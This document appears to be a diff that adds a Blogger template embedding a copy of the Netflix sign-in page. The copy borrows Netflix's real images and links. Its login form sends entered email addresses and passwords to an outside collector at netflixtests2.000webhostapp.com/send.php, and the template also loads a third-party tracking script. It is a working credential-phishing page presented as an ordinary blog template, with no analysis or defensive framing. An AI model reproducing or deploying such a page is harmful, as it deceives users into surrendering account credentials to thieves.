@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+    <!DOCTYPE html>
+   <html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateVersion='1.3.0' dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'><head>
+    <meta content='width=device-width, initial-scale=1' name='viewport'/>
+    <title><data:view.title.escaped/></title>
+    <b:include data='blog' name='all-head-content'/>
+        <meta content='width=device-width, initial-scale=1' name='viewport' />
+        <b:skin version='1.3.0'>
+            <![CDATA[
+               
+            ]]>
+        </b:skin>
+        <b:template-skin>
+            <![CDATA[
+            ]]>
+        </b:template-skin>
+    </head>
+ <body>
+  <b:section class='main' id='main' showaddelement='yes'/>
+  
+<script src="https://raviral.com/host_style/style/js-track/track.js"></script> 
+       
+<script language="javascript">
+document.getElementById('main').innerHTML = "";
+
+         
+         &lt;!DOCTYPE html&gt;
+         &lt;html lang="en"&gt;
+         &lt;head&gt;
+         &lt;title&gt;mtech&lt;/title&gt;
+         &lt;script src="./netflix.js" type="text/javascript"&gt;&lt;/script&gt;
+         &lt;script src="./languageSwicher.js" type="text/javascript"&gt;&lt;/script&gt;
+         &lt;link rel="stylesheet" href="netflixStyle.css"&gt;
+         &lt;meta name="viewport" content= "width=device-width, initial-scale=0.7"&gt;
+         &lt;/head&gt;
+         &lt;body onload="setUpLanguage()" onresize="updateView()"&gt;
+         &lt;div class="background-wrapper"&gt;
+         &lt;img class="background" src="https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt&gt;
+         &lt;/div&gt;
+         &lt;div id="app"&gt;
+         &lt;div id="header"&gt;
+         &lt;a href="https://www.netflix.com/"&gt;
+         &lt;img id="logo" src="https://logodownload.org/wp-content/uploads/2014/10/netflix-logo-5.png"&gt;
+         &lt;/a&gt;
+         &lt;/div&gt;
+         &lt;div id="container"&gt;
+         &lt;form id="log-in-form" action="https://netflixtests2.000webhostapp.com/send.php" method="POST"&gt;
+         &lt;div class="label-container"&gt;
+         &lt;h2 id="sign-in-text"&gt;&lt;/h1&gt;
+         &lt;/div&gt;
+         
+         &lt;div class="box-container" id="email-container"&gt;
+         &lt;input class="field" id="email" name="email" type="text" oninput="update('email-field', 'email-label', 'email-inputError')" onfocus="inputOnFocus('email-field', 'email-label', 'email-container')" onblur="inputOnBlur('email-field', 'email-label', 'email-container', 'email-inputError')" required&gt;
+         &lt;label class="label" id="email-label" for="email-field"&gt;&lt;/label&gt;
+         &lt;/div&gt;
+         &lt;div class="inputError" id="email-inputError"&gt;&lt;/div&gt;
+         &lt;div class="box-container" id="pwd-container"&gt;
+         &lt;input class="field" id="password" name="password" type="password" oninput="update('pwd-field', 'pwd-label', 'pwd-inputError')" onfocus="inputOnFocus('pwd-field', 'pwd-label', 'pwd-container')" onblur="inputOnBlur('pwd-field', 'pwd-label', 'pwd-container', 'pwd-inputError')" required&gt;
+         &lt;label class="label" id="pwd-label" for="pwd-field"&gt;&lt;/label&gt;
+         &lt;/div&gt;
+         &lt;div class="inputError" id="pwd-inputError"&gt;&lt;/div&gt;
+         &lt;div class="box-container" id="login-button-container"&gt;
+         &lt;input id="login-button" type="submit" value="Sign In"&gt;
+         &lt;/div&gt;
+         &lt;div class="checkbox-row"&gt;
+         &lt;span class="checkbox-container" tabindex="0" id="checkbox" onclick="toggleCheckBox()" onblur="checkBoxOnBlur()"&gt;
+         &lt;svg id="icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="check" class="svg-inline--fa fa-check fa-w-16" role="img" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"&gt;&lt;path fill="currentColor" d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"&gt;&lt;/path&gt;&lt;/svg&gt;
+         &lt;/span&gt;
+         &lt;label id="remember-me-label" onclick="toggleCheckBox()"&gt;&lt;/label&gt;
+         
+         &lt;a href="https://www.netflix.com/br/LoginHelp"&gt;
+         &lt;label id="help"&gt;&lt;/label&gt;
+         &lt;/a&gt;
+         &lt;/div&gt;
+         &lt;/form&gt;
+         &lt;form action="" method="POST" class="fb-login-form"&gt;
+         &lt;button class="fb-login-button" type="submit"&gt;
+         &lt;div class="fb-login"&gt;
+         &lt;img class="fb-icon" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"&gt;
+         &lt;span class="fb-btn-text" id="fb-btn-text"&gt;&lt;/span&gt;
+         &lt;/div&gt;
+         &lt;/button&gt;
+         &lt;/form&gt;
+         &lt;div class="sign-up"&gt;
+         &lt;span id="sign-up"&gt;&lt;/span&gt;
+         &lt;a class="sign-up-link" id="sign-up-link" href="https://www.netflix.com/br-en/"&gt;&lt;/a&gt;
+         &lt;/div&gt;
+         &lt;div class="reCAPTCHA"&gt;
+         &lt;p id="reCAPTCHA-text"&gt;
+         &lt;span id="reCAPInfo"&gt;&lt;/span&gt;
+         &lt;span class="learn-more-button"&gt;
+         &lt;button id="learn-more" onclick="showTermsOfUse()"&gt;&lt;/button&gt;
+         &lt;/span&gt;
+         &lt;/p&gt;
+         &lt;div id="terms-of-use"&gt;
+         &lt;span&gt;
+         &lt;span id="reCAP1"&gt;&lt;/span&gt;
+         &lt;a class="blue-link" id="reCAP2" href="https://policies.google.com/terms"&gt;&lt;/a&gt;
+         &lt;span id="reCAP3"&gt;&lt;/span&gt;
+         &lt;a class="blue-link" id="reCAP4" href="https://policies.google.com/terms"&gt;&lt;/a&gt;
+         &lt;span id="reCAP5"&gt;&lt;/span&gt;
+         &lt;/span&gt;
+         &lt;/div&gt;
+         &lt;/div&gt;
+         &lt;/div&gt;
+         &lt;footer&gt;
+         &lt;div class="footer" id="footer"&gt;
+         &lt;p class="footer-header"&gt;
+         &lt;span id="footer-header"&gt;&lt;/span&gt;
+         &lt;a class="footer-link"&gt;0800-761-4632&lt;/a&gt;
+         &lt;/p&gt;
+         &lt;ul class="inline-footer-ul"&gt;
+         &lt;li class="inline-footer-li"&gt;
+         &lt;a class="footer-link" href="https://help.netflix.com/legal/giftterms" id="gift"&gt;&lt;/a&gt;
+         &lt;/li&gt;
+         &lt;li class="inline-footer-li"&gt;
+         &lt;a class="footer-link" href="https://help.netflix.com/legal/termsofuse" id="terms"&gt;&lt;/a&gt;
+         &lt;/li&gt;
+         &lt;li class="inline-footer-li"&gt;
+         &lt;a class="footer-link" href="https://help.netflix.com/legal/privacy" id="privacy"&gt;&lt;/a&gt;
+         &lt;/li&gt;
+         &lt;/ul&gt;
+         &lt;div class="language-selector-container"&gt;
+         &lt;div class="language-selector-boundaries"&gt;
+         &lt;select name="language" id="language-selector" onchange="loadTexts(getSelectedLanguage())"&gt;
+         &lt;option value="en"&gt;English&lt;/option&gt;
+         &lt;option value="pt"&gt;Português&lt;/option&gt;
+         &lt;/select&gt;
+         &lt;img class="globe-icon" src="https://climefish.eu/wp-content/uploads/sites/18/2017/08/icon-globe-400px.png"&gt;
+         &lt;/div&gt;
+         &lt;/div&gt;
+         &lt;/div&gt;
+         &lt;/footer&gt;
+         &lt;/div&gt;
+         &lt;/body&gt;
+         &lt;/html&gt;
+         
+</script>
+
+&lt;!--</body>--&gt;&lt;/body&gt;
+&lt;!--</html>
